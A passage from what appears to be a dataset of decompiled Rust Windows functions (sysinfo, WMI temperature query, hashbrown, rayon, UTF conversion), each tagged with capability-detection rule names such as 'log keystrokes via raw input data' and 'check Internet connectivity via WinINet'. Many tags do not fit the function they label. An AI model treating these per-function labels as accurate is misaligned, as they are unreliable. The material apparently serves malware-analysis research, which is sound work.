pauStack336 = pauStack680;\n            pauStack328 = uStack688;\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h202f1decaac64da5(&pauStack336);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&iStack664);\n            return;\n        }\n        iVar6 = *(pauVar15[10] + 8);\n        if (iVar6 == 2) {\n            pauVar15 = pauVar15[0x11];\n            goto code_r0x00440983;\n        }\n        puVar7 = *(pauVar15[4] + 8);\n        pauVar12 = pauVar15;\n        puVar13 = &uStack520;\n        for (iVar8 = 9; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar13 = **pauVar12;\n            pauVar12 = *pauVar12 + 8;\n            puVar13 = puVar13 + 1;\n        }\n        pauVar12 = pauVar15[5];\n        ppuVar14 = &puStack616;\n        for (iVar8 = 0xb; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *ppuVar14 = **pauVar12;\n            pauVar12 = *pauVar12 + 8;\n            ppuVar14 = ppuVar14 + 1;\n        }\n        pauVar12 = pauVar15[0xb];\n        ppuVar14 = &puStack440;\n        for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *ppuVar14 = **pauVar12;\n            pauVar12 = *pauVar12 + 8;\n            ppuVar14 = ppuVar14 + 1;\n        }\n        pauStack792 = pauVar15;\n        iStack784 = iVar6;\n        iStack776 = iVar10;\n        puStack720 = puVar7;\n        arg2 = sym.core::hash::BuildHasher::hash_one::h2b336202073f8864(*puVar4, puVar4[1], puVar7);\n        puVar13 = puStack800;\n        iVar6 = sym.hashbrown::raw::RawTable_T_A_::get_mut::h822e361a6cec7342(puStack800, arg2, &puStack720);\n        puVar16 = puStack720;\n        if (iVar6 == 0) {\n            iVar10 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(puVar13, arg2);\n            arg1_00 = puStack800;\n            uVar1 = *(puVar4[3] + iVar10);\n            if ((puVar4[4] == 0) && ((uVar1 & 1) != 0)) {\n                sym.hashbrown::raw::RawTable_T_A_::reserve_rehash::hc9ecd749d2069f31(puStack800, puStack808);\n                iVar10 = sym.hashbrown::raw::RawTableInner_A_::find_insert_slot::h93b90925f579d537(arg1_00, arg2);\n            }\n            sym.hashbrown::raw::RawTableInner_A_::record_item_insert_at::h24d089cf3fcd1ed6\n                      (puStack800, iVar10, puVar13 & 0xffffff00 | uVar1, arg2);\n            iVar8 = puStack808[3];\n            iVar10 = iVar10 * -0x118;\n            iVar6 = iVar8 + iVar10;\n            *(iVar6 + -0x118) = puVar16;\n            puVar13 = &uStack520;\n            puVar16 = iVar6 + -0x110;\n            for (iVar9 = 9; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar16 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar16 = puVar16 + 1;\n            }\n            *(iVar6 + -200) = puVar7;\n            puVar7 = iVar8 + -0xc0 + iVar10;\n            ppuVar14 = &puStack616;\n            puVar13 = puVar7;\n            for (iVar6 = 0xb; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar13 = *ppuVar14;\n                ppuVar14 = ppuVar14 + 1;\n                puVar13 = puVar13 + 1;\n            }\n            puVar7[0xb] = iStack784;\n            ppuVar14 = &puStack440;\n            puVar7 = iVar8 + -0x60 + iVar10;\n            for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar7 = *ppuVar14;\n                ppuVar14 = ppuVar14 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            uStack168 = 2;\n            pauVar15 = pauStack792;\n            iVar10 = iStack776;\n        }\n        else {\n            sym.memcpy(&pauStack336, iVar6 + 8, 0x110);\n            iVar10 = iStack776;\n            pauVar15 = pauStack792;\n            puVar13 = &uStack520;\n            puVar16 = iVar6 + 8;\n            for (iVar8 = 9; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar16 = *puVar13;\n                puVar13 = puVar13 + 1;\n                puVar16 = puVar16 + 1;\n            }\n            *(iVar6 + 0x50) = puVar7;\n            ppuVar14 = &puStack616;\n            puVar7 = iVar6 + 0x58;\n            for (iVar8 = 0xb; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar7 = *ppuVar14;\n                ppuVar14 = ppuVar14 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            *(iVar6 + 0xb0) = iStack784;\n            ppuVar14 = &puStack440;\n            puVar7 = iVar6 + 0xb8;\n            for (iVar8 = 0xc; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar7 = *ppuVar14;\n                ppuVar14 = ppuVar14 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            if (uStack168 != 2) {\n                sym.core::ptr::drop_in_place_sysinfo::windows::process::Process_::he2d436bb30ee18b4(&pauStack336);\n            }\n        }\n        pauVar15 = pauVar15[0x11];\n        iVar10 = iVar10 + -0x110;\n    } while( true );\n}\n",
        "token_count": 4786
    },
    "52802567": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::connect_server::h5280256771dd6976(ulong *arg1, int32_t *arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    ulong uVar8;\n    ulong uStack40;\n    \n    // sysinfo::windows::component::Connection::connect_server::h5280256771dd6976\n    uStack40 = 0;\n    if (*arg2 == 1) {\n        uVar8 = sub.OLEAUT32.dll_SysAllocString(0x44c070);\n        iVar7 = (**(**(arg2 + 2) + 0x18))(*(arg2 + 2), uVar8, 0, 0, 0, 0, ZEXT816(0), &uStack40);\n        sub.OLEAUT32.dll_SysFreeString(uVar8);\n        uVar8 = uStack40;\n        if (-1 < iVar7) {\n            sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n                      (arg2 + 4);\n            *(arg2 + 4) = 1;\n            *(arg2 + 6) = uVar8;\n            iVar7 = *arg2;\n            iVar1 = arg2[1];\n            iVar2 = arg2[2];\n            iVar3 = arg2[3];\n            iVar4 = arg2[9];\n            iVar5 = arg2[10];\n            iVar6 = arg2[0xb];\n            *(arg1 + 4) = arg2[8];\n            *(arg1 + 0x24) = iVar4;\n            *(arg1 + 5) = iVar5;\n            *(arg1 + 0x2c) = iVar6;\n            *arg1 = iVar7;\n            *(arg1 + 4) = iVar1;\n            *(arg1 + 1) = iVar2;\n            *(arg1 + 0xc) = iVar3;\n            arg1[2] = *(arg2 + 4);\n            arg1[3] = *(arg2 + 6);\n            return;\n        }\n    }\n    *arg1 = 2;\n    sym.core::ptr::drop_in_place_sysinfo::windows::component::Connection_::hf4b196367c8b12b6(arg2);\n    return;\n}\n",
        "token_count": 565
    },
    "73216c34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::set_proxy_blanket::h73216c3484e1ebbd(ulong *arg1, ulong *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    int32_t iVar12;\n    uint uStack48;\n    uint uStack44;\n    ulong uStack40;\n    \n    // sysinfo::windows::component::Connection::set_proxy_blanket::h73216c3484e1ebbd\n    if (*(arg2 + 2) == 1) {\n        uStack48 = 3;\n        uStack40 = 0;\n        iVar12 = sub.ole32.dll_CoSetProxyBlanket(arg2[3], 10, 0, 0, 3);\n        if (-1 < iVar12) {\n            uVar1 = *arg2;\n            uVar2 = *(arg2 + 4);\n            uVar3 = *(arg2 + 1);\n            uVar4 = *(arg2 + 0xc);\n            uVar5 = *(arg2 + 2);\n            uVar6 = *(arg2 + 0x14);\n            uVar7 = *(arg2 + 3);\n            uVar8 = *(arg2 + 0x1c);\n            uVar9 = *(arg2 + 0x24);\n            uVar10 = *(arg2 + 5);\n            uVar11 = *(arg2 + 0x2c);\n            *(arg1 + 4) = *(arg2 + 4);\n            *(arg1 + 0x24) = uVar9;\n            *(arg1 + 5) = uVar10;\n            *(arg1 + 0x2c) = uVar11;\n            *(arg1 + 2) = uVar5;\n            *(arg1 + 0x14) = uVar6;\n            *(arg1 + 3) = uVar7;\n            *(arg1 + 0x1c) = uVar8;\n            *arg1 = uVar1;\n            *(arg1 + 4) = uVar2;\n            *(arg1 + 1) = uVar3;\n            *(arg1 + 0xc) = uVar4;\n            return;\n        }\n    }\n    *arg1 = 2;\n    uStack48 = *(arg2 + 4);\n    uStack44 = *(arg2 + 0x24);\n    uStack40 = arg2[5];\n    arg2[4] = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n              (&uStack48);\n    uStack48 = *(arg2 + 2);\n    uStack44 = *(arg2 + 0x14);\n    uStack40 = arg2[3];\n    arg2[2] = 0;\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (&uStack48);\n    uStack48 = *arg2;\n    uStack44 = *(arg2 + 4);\n    uStack40 = arg2[1];\n    *arg2 = 0;\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af\n              (&uStack48);\n    sub.ole32.dll_CoUninitialize();\n    sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Instance__::h1a43ba318d61a6af(arg2);\n    sym._ZN4core3ptr94drop_in_place_LT_core..option..Option_LT_sysinfo..windows..component..ServerConnection_GT__GT_17h72763548619fad6\n              (arg2 + 2);\n    if ((arg2[4] != 0) && (arg2[5] != NULL)) {\n    // WARNING: Could not recover jumptable at 0x0043e85d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*arg2[5] + 0x10))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 992
    },
    "9da30763": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::exec_query::h9da30763d39de1c5(ulong *arg1, uint *arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    ulong uVar9;\n    ulong uVar10;\n    ulong uStack48;\n    \n    // sysinfo::windows::component::Connection::exec_query::h9da30763d39de1c5\n    uStack48 = 0;\n    if (arg2[4] == 1) {\n        uVar9 = sub.OLEAUT32.dll_SysAllocString(0x44c082);\n        uVar10 = sub.OLEAUT32.dll_SysAllocString(L\"SELECT * FROM MSAcpi_ThermalZoneTemperature\");\n        iVar8 = (**(**(arg2 + 6) + 0xa0))(*(arg2 + 6), uVar9, uVar10, 0x30, 0, &uStack48);\n        sub.OLEAUT32.dll_SysFreeString(uVar9);\n        sub.OLEAUT32.dll_SysFreeString(uVar10);\n        uVar9 = uStack48;\n        if (-1 < iVar8) {\n            sym.core::ptr::drop_in_place_core::option::Option_sysinfo::windows::component::Enumerator__::hcf9e9d88b61ba464\n                      (arg2 + 8);\n            *(arg2 + 8) = 1;\n            *(arg2 + 10) = uVar9;\n            uVar1 = *arg2;\n            uVar2 = arg2[1];\n            uVar3 = arg2[2];\n            uVar4 = arg2[3];\n            uVar5 = arg2[5];\n            uVar6 = arg2[6];\n            uVar7 = arg2[7];\n            *(arg1 + 2) = arg2[4];\n            *(arg1 + 0x14) = uVar5;\n            *(arg1 + 3) = uVar6;\n            *(arg1 + 0x1c) = uVar7;\n            *arg1 = uVar1;\n            *(arg1 + 4) = uVar2;\n            *(arg1 + 1) = uVar3;\n            *(arg1 + 0xc) = uVar4;\n            arg1[4] = *(arg2 + 8);\n            arg1[5] = *(arg2 + 10);\n            return;\n        }\n    }\n    *arg1 = 2;\n    sym.core::ptr::drop_in_place_sysinfo::windows::component::Connection_::hf4b196367c8b12b6(arg2);\n    return;\n}\n",
        "token_count": 625
    },
    "2e042d15": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.sysinfo::windows::component::Connection::temperature::h2e042d15b548ab9a(float *arg1, int64_t arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    float fVar5;\n    float fVar6;\n    float in_XMM7_Da;\n    ulong var_10h;\n    int64_t *piStack168;\n    int32_t iStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    ulong uStack136;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    ulong uStack112;\n    \n    // sysinfo::windows::component::Connection::temperature::h2e042d15b548ab9a\n    iVar1 = *(arg2 + 0x20);\n    *(arg2 + 0x20) = 0;\n    if (iVar1 == 0) {\n        arg1[1] = 2.802597e-45;\n        return;\n    }\n    piVar2 = *(arg2 + 0x28);\n    piStack168 = NULL;\n    iStack156 = 0;\n    (**(*piVar2 + 0x20))(piVar2, 0xffffffff, 1, &piStack168, &iStack156);\n    if (iStack156 != 0) {\n        (**(*piStack168 + 0x40))(piStack168, 0x40);\n        uVar4 = sub.OLEAUT32.dll_SysAllocString(L\"CurrentTemperature\");\n        fVar5 = 0.0;\n        iVar3 = (**(*piStack168 + 0x20))(piStack168, uVar4, 0, &uStack128, ZEXT816(0));\n        uStack136 = uStack112;\n        uStack152 = uStack128;\n        uStack148 = uStack124;\n        uStack144 = uStack120;\n        uStack140 = uStack116;\n        sub.OLEAUT32.dll_SysFreeString(uVar4);\n        sub.OLEAUT32.dll_VariantClear(&uStack152);\n        if (-1 < iVar3) {\n            fVar6 = CONCAT44(uStack140, uStack144) / 10 + *0x4445d0;\n            if (arg3 != '\\0') {\n                uVar4 = sub.OLEAUT32.dll_SysAllocString(L\"CriticalTripPoint\", CONCAT44(uStack140, uStack144) % 10);\n                fVar5 = 0.0;\n                iVar3 = (**(*piStack168 + 0x20))(piStack168, uVar4, 0, &uStack152, ZEXT816(0));\n                sub.OLEAUT32.dll_SysFreeString(uVar4);\n                sub.OLEAUT32.dll_VariantClear(&uStack152);\n                if (-1 < iVar3) {\n                    in_XMM7_Da = CONCAT44(uStack140, uStack144) / 10 + *0x4445d0;\n                    fVar5 = 1.401298e-45;\n                }\n            }\n            (**(*piStack168 + 0x10))();\n            *arg1 = fVar6;\n            arg1[1] = fVar5;\n            arg1[2] = in_XMM7_Da;\n            goto code_r0x00440f4d;\n        }\n        (**(*piStack168 + 0x10))();\n    }\n    arg1[1] = 2.802597e-45;\ncode_r0x00440f4d:\n    (**(*piVar2 + 0x10))(piVar2);\n    return;\n}\n",
        "token_count": 832
    },
    "d3f8defc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym._core::str::lossy::Utf8LossyChunksIter_as_core::iter::traits::iterator::Iterator_::next::hd3f8defc01dfd2a6\n               (int64_t *arg1, int64_t *arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint8_t *puVar7;\n    uint64_t uVar8;\n    \n    // <core::str::lossy::Utf8LossyChunksIter as core::iter::traits::iterator::Iterator>::next::hd3f8defc01dfd2a6\n    uVar4 = arg2[1];\n    if (uVar4 == 0) {\n        *arg1 = 0;\n    }\n    else {\n        iVar5 = *arg2;\n        uVar6 = 0;\n        do {\n            uVar1 = *(iVar5 + uVar6);\n            uVar8 = uVar6 + 1;\n            if (uVar1 < '\\0') {\n                cVar2 = *(uVar1 + 0x449579);\n                if (cVar2 == '\\x02') {\n                    puVar7 = iVar5 + uVar8;\n                    if (uVar4 <= uVar8) {\n                        puVar7 = 0x444936;\n                    }\n                    if ((*puVar7 & 0xc0) != 0x80) break;\n                    uVar8 = uVar6 + 2;\n                }\n                else if (cVar2 == '\\x03') {\n                    puVar7 = iVar5 + uVar8;\n                    if (uVar4 <= uVar8) {\n                        puVar7 = 0x444936;\n                    }\n                    uVar3 = *puVar7;\n                    if (uVar1 == 0xe0) {\n                        if ((uVar3 & 0xe0) != 0xa0) break;\n                    }\n                    else if (uVar1 == 0xed) {\n                        if (-0x61 < uVar3) break;\n                    }\n                    else if (uVar1 + 0x1f < 0xc) {\n                        if (-0x41 < uVar3) break;\n                    }\n                    else if ((((uVar1 & 0xfe) != 0xee) || (-1 < uVar3)) || (0xbf < uVar3)) break;\n                    uVar8 = uVar6 + 2;\n                    puVar7 = iVar5 + 2 + uVar6;\n                    if (uVar4 <= uVar8) {\n                        puVar7 = 0x444936;\n                    }\n                    if ((*puVar7 & 0xc0) != 0x80) break;\n                    uVar8 = uVar6 + 3;\n                }\n                else {\n                    if (cVar2 != '\\x04') break;\n                    puVar7 = iVar5 + uVar8;\n                    if (uVar4 <= uVar8) {\n                        puVar7 = 0x444936;\n                    }\n                    uVar3 = *puVar7;\n                    if (uVar1 == 0xf0) {\n                        if (0x2f < uVar3 + 0x70) break;\n                    }\n                    else if (uVar1 == 0xf4) {\n                        if (-0x71 < uVar3) break;\n                    }\n                    else if (((2 < uVar1 + 0xf) || (-1 < uVar3)) || (0xbf < uVar3)) break;\n                    puVar7 = iVar5 + 2 + uVar6;\n                    if (uVar4 <= uVar6 + 2) {\n                        puVar7 = 0x444936;\n                    }\n                    uVar8 = uVar6 + 2;\n                    if ((*puVar7 & 0xc0) != 0x80) break;\n                    uVar8 = uVar6 + 3;\n                    puVar7 = iVar5 + 3 + uVar6;\n                    if (uVar4 <= uVar8) {\n                        puVar7 = 0x444936;\n                    }\n                    if ((*puVar7 & 0xc0) != 0x80) break;\n                    uVar8 = uVar6 + 4;\n                }\n            }\n            uVar6 = uVar8;\n            uVar8 = uVar6;\n        } while (uVar6 < uVar4);\n        *arg2 = iVar5 + uVar8;\n        arg2[1] = uVar4 - uVar8;\n        *arg1 = iVar5;\n        arg1[1] = uVar6;\n        arg1[2] = iVar5 + uVar6;\n        arg1[3] = uVar8 - uVar6;\n    }\n    return;\n}\n",
        "token_count": 1064
    },
    "568fdafc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym.once_cell::sync::Lazy_T_F_::force::h568fdafcba663bad(void)\n\n{\n    uchar auStack48 [8];\n    ulong uStack40;\n    ulong uStack32;\n    ulong *puStack24;\n    ulong *puStack16;\n    uchar *puStack8;\n    \n    // once_cell::sync::Lazy<T,F>::force::h568fdafcba663bad\n    if (*0x443020 != 2) {\n        puStack24 = &uStack40;\n        uStack40 = 0x443020;\n        puStack16 = &uStack32;\n        uStack32 = 0x443028;\n        puStack8 = auStack48;\n        sym.once_cell::imp::initialize_or_wait::heb664d7426bc1566(0x443020, &puStack24, 0x445b38);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "7414ea3b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5(int64_t arg1)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    char cVar5;\n    int64_t arg2;\n    int32_t iVar6;\n    \n    // rayon_core::sleep::Sleep::work_found::h7414ea3b54864ef5\n    LOCK();\n    puVar1 = arg1 + 0x28;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 - 0x10000;\n    iVar6 = 2;\n    if ((uVar3 & 0xffff) < 2) {\n        iVar6 = uVar3 & 0xffff;\n    }\n    if (iVar6 != 0) {\n        iVar4 = *(arg1 + 0x20);\n        arg2 = 0;\n        do {\n            if (iVar4 == arg2) {\n                return;\n            }\n            iVar2 = arg2 + 1;\n            cVar5 = sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(arg1, arg2);\n            arg2 = iVar2;\n        } while ((cVar5 == '\\0') || (iVar6 = iVar6 + -1,  iVar6 != 0));\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "e4b888c6": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym.core::ptr::drop_in_place_std::io::error::Error_::he4b888c6445ebac5(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    \n    // core::ptr::drop_in_place<std::io::error::Error>::he4b888c6445ebac5\n    uVar1 = arg1 & 3;\n    if ((1 < uVar1 - 2) && (uVar1 != 0)) {\n        (***(arg1 + 7))(*(arg1 + -1));\n        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.187\n                  (*(arg1 + -1), *(*(arg1 + 7) + 8), *(*(arg1 + 7) + 0x10));\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, arg1 + -1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "fc118c83": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym._rayon_core::latch::SpinLatch_as_rayon_core::latch::Latch_::set::hfc118c83e1d97d0a(int64_t *arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t *piStack24;\n    \n    // <rayon_core::latch::SpinLatch as rayon_core::latch::Latch>::set::hfc118c83e1d97d0a\n    cVar1 = *(arg1 + 3);\n    if (cVar1 == '\\0') {\n        piVar3 = *arg1[1];\n    }\n    else {\n        piVar3 = *arg1[1];\n        LOCK();\n        iVar2 = *piVar3;\n        *piVar3 = *piVar3 + 1;\n        piStack24 = piVar3;\n        if (*piVar3 == 0 || SCARRY8(iVar2, 1) != *piVar3 < 0) {\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    iVar2 = *arg1;\n    *arg1 = 3;\n    if (iVar2 == 2) {\n        sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(piVar3 + 0x35, arg1[2]);\n    }\n    if (cVar1 != '\\0') {\n        LOCK();\n        *piStack24 = *piStack24 + -1;\n        if (*piStack24 == 0) {\n            sym.alloc::sync::Arc_T_::drop_slow::ha24e02ecb32d4472(&piStack24);\n        }\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "cf07ab31": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym.alloc::string::String::from_utf16_lossy::hcf07ab31823adcce(int64_t *arg1, uint16_t *arg2, uint64_t arg3)\n\n{\n    uint16_t *puVar1;\n    int64_t iVar2;\n    bool bVar3;\n    uint16_t uVar4;\n    uchar uVar5;\n    uint32_t uVar6;\n    uint64_t arg2_00;\n    uint64_t uVar7;\n    int64_t arg2_01;\n    uint16_t unaff_BP;\n    uint16_t uVar8;\n    uint32_t uStack68;\n    \n    // alloc::string::String::from_utf16_lossy::hcf07ab31823adcce\n    puVar1 = arg2 + arg3;\n    *(arg1 + 1) = ZEXT816(0);\n    *arg1 = 1;\n    sym.alloc::vec::Vec_T_A_::reserve::h6f0bd74d4d2bb641(arg1, (arg3 >> 1) + (arg3 & 1));\n    bVar3 = false;\n    do {\n        while( true ) {\n            uVar4 = unaff_BP;\n            if (!bVar3) {\n                if (arg2 == puVar1) {\n                    return;\n                }\n                uVar4 = *arg2;\n                arg2 = arg2 + 1;\n            }\n            if ((uVar4 & 0xf800) != 0xd800) break;\n            uVar8 = unaff_BP;\n            if (uVar4 < 0xdc00) {\n                if (arg2 == puVar1) {\n                    bVar3 = false;\n                    arg2 = puVar1;\n                }\n                else {\n                    uVar8 = *arg2;\n                    arg2 = arg2 + 1;\n                    bVar3 = true;\n                    if (0xfbff < uVar8 + 0x2000) {\n                        uVar7 = ((uVar8 + 0x2400 & 0xffff) << 0x20 | uVar4 + 0x2800 << 0x2a) + 0x1000000000000;\n                        goto code_r0x0043d317;\n                    }\n                }\n            }\n            else {\n                bVar3 = false;\n            }\n            arg2_00 = 0xfffd;\n            unaff_BP = uVar8;\ncode_r0x0043d333:\n            uStack68 = (CONCAT12(arg2_00, CONCAT11(arg2_00 >> 6, arg2_00 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff |\n                       0x800000;\n            arg2_01 = 3;\ncode_r0x0043d35a:\n            sym.alloc::vec::Vec_T_A_::reserve::h6f0bd74d4d2bb641(arg1, arg2_01);\n            iVar2 = arg1[2];\n            sym.memcpy(*arg1 + iVar2, &uStack68, arg2_01);\n            arg1[2] = iVar2 + arg2_01;\n        }\n        uVar7 = uVar4 << 0x20;\ncode_r0x0043d317:\n        arg2_00 = uVar7 >> 0x20;\n        uVar6 = uVar7 >> 0x20;\n        if (0x7f < uVar6) {\n            uVar5 = uVar7 >> 0x20;\n            if (uVar6 < 0x800) {\n                uStack68 = (CONCAT11(uVar5, uVar6 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n                arg2_01 = 2;\n            }\n            else {\n                if (uVar6 < 0x10000) {\n                    bVar3 = false;\n                    goto code_r0x0043d333;\n                }\n                uStack68 = CONCAT13(uVar5, CONCAT12(uVar6 >> 6, CONCAT11(uVar6 >> 0xc, uVar6 >> 0x12))) & 0x3f3f3f07 |\n                           0x808080f0;\n                arg2_01 = 4;\n            }\n            bVar3 = false;\n            goto code_r0x0043d35a;\n        }\n        sym.alloc::vec::Vec_T_A_::push::he0835cd99a235e59(arg1, arg2_00);\n        bVar3 = false;\n    } while( true );\n}\n",
        "token_count": 1012
    },
    "27d722ea": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid sym.once_cell::sync::Lazy_T_F_::force::h27d722ea20f00de2(void)\n\n{\n    uchar auStack48 [8];\n    ulong uStack40;\n    ulong uStack32;\n    ulong *puStack24;\n    ulong *puStack16;\n    uchar *puStack8;\n    \n    // once_cell::sync::Lazy<T,F>::force::h27d722ea20f00de2\n    if (*0x4430f8 != 2) {\n        puStack24 = &uStack40;\n        uStack40 = 0x4430f8;\n        puStack16 = &uStack32;\n        uStack32 = 0x443100;\n        puStack8 = auStack48;\n        sym.once_cell::imp::initialize_or_wait::heb664d7426bc1566(0x4430f8, &puStack24, 0x44bf60);\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "ad4d00c9": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
